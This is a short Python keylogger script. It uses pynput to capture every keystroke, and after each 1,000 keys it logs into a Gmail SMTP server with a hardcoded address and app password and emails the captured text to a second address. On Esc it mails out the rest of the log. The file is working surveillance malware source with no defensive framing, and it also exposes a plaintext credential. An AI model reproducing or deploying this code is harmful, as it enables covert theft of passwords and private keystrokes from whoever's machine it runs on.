from pynput.keyboard import Key, Listener
import smtplib
import ssl
count = 0
keys = []
def on_press(key):
    global keys, count 
    print(key)
    if key == Key.space:
        keys.append("_")
    elif key == Key.shift_r or key == Key.shift_l:
        pass
    elif key == Key.backspace:
        if len(keys)>0:
            keys.pop()
        else:
            pass
    else:
        keys.append(key)
    count += 1 
    send_mail()

def on_release(key):
    if key == Key.esc:
        final_mail()
        return False
        
        
def send_mail():
    global count, keys
    if count >= 1000:
        temp = ''.join(str(e) for e in keys)
        message = temp.replace("''", "")
        sender_email = "malachirichlin@gmail.com"
        reciever_email = "malscodetester@gmail.com"
        password = "pwtpaasrgjsplcex"
        server =smtplib.SMTP_SSL('smtp.gmail.com')
        server.ehlo()
        server.login(sender_email, password)
        print("Login success")
        server.sendmail(sender_email, reciever_email, message)
        print("email has been sent")
        server.quit()
        count = 0
        keys = []
    
def final_mail():
    global keys, count
    temp = ''.join(str(e) for e in keys)
    message = temp.replace("''", "")
    sender_email = input("What is your email address?: ")
    reciever_email = sender_email
    password = input("What is your email(app) password?: ")
    server =smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    server.login(sender_email, password)
    print("Login success")
    server.sendmail(sender_email, reciever_email, message)
    print("email has been sent")
    server.quit()
    count = 0
    keys = []

with Listener(on_press =on_press, on_release =on_release) as listener:
    listener.join()


